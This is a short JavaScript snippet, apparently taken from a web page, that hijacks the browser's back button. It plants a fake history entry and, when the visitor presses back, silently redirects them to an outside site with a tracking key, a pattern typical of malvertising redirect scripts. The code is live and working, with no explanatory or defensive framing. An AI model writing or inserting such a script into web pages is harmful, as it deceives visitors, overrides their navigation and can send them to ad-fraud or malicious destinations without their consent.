
(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("https://www.trustedgatetocontent.com/uakns2pa4q?key=80732eb774e6770e4a5e57a38b14a181");
    },10);
  }
}, false);
}(window, location));
